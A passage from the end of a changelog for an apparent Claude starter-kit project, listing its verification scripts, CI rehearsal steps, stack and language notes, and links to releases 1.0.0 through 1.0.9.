  hook injects it every turn — session health rests on measurement, not guesswork.
- **Verification**: static `smoke-test.sh` + behavioral `routing-eval.sh` (golden routing + conflicts).
- **CI**: GitHub Actions runs syntax + smoke + routing + 6-profile e2e rehearsal on every push/PR.

### Notes
- The discipline layer and the frontend are stack-agnostic; the backend is opinionated (.NET/DevArchitecture) or generic.
- Language is Turkish. No AI trace / third-party template name leaks into the artifacts (§4).

[1.0.9]: https://github.com/byerlikaya/claude-starter-kit/releases/tag/v1.0.9
[1.0.8]: https://github.com/byerlikaya/claude-starter-kit/releases/tag/v1.0.8
[1.0.7]: https://github.com/byerlikaya/claude-starter-kit/releases/tag/v1.0.7
[1.0.6]: https://github.com/byerlikaya/claude-starter-kit/releases/tag/v1.0.6
[1.0.5]: https://github.com/byerlikaya/claude-starter-kit/releases/tag/v1.0.5
[1.0.4]: https://github.com/byerlikaya/claude-starter-kit/releases/tag/v1.0.4
[1.0.3]: https://github.com/byerlikaya/claude-starter-kit/releases/tag/v1.0.3
[1.0.2]: https://github.com/byerlikaya/claude-starter-kit/releases/tag/v1.0.2
[1.0.1]: https://github.com/byerlikaya/claude-starter-kit/releases/tag/v1.0.1
[1.0.0]: https://github.com/byerlikaya/claude-starter-kit/releases/tag/v1.0.0
